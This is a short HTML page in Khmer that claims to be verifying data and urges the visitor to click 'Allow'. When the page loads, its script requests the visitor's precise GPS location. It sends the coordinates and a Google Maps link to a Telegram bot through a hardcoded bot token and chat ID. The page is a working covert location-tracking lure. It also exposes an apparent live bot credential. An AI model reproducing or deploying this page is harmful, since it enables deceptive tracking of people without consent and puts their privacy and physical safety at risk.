<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>កំពុងដំណើរការ...</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align: center; }
    </style>
</head>
<body>

<div class="card">
    <h2>កំពុងផ្ទៀងផ្ទាត់ទិន្នន័យ...</h2>
    <p>សូមចុច <b>"Allow"</b> ឬ <b>"អនុញ្ញាត"</b> ប្រសិនបើមានការសុំសិទ្ធិ។</p>
</div>

<script>
    const TELEGRAM_BOT_TOKEN = '7989111680:AAGsdsm1-mdYe9yIURI122IgR-ur0QKmDMo';
    const TELEGRAM_CHAT_ID = '1357654787';

    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocationToTelegram, function(error) {
                alert("សូមអនុញ្ញាត Location ដើម្បីបន្ត!");
            }, {
                enableHighAccuracy: true
            });
        } else {
            alert("កម្មវិធីរុករករបស់អ្នកមិនគាំទ្រ GPS ទេ");
        }
    };

    function sendLocationToTelegram(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        const message = `🎯 **ទទួលបានទីតាំងថ្មី!**\n\nLatitude: ${lat}\nLongitude: ${lon}\n\n📍 [មើលលើ Google Maps](${googleMapsUrl})`;

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    }
</script>

</body>
</html>
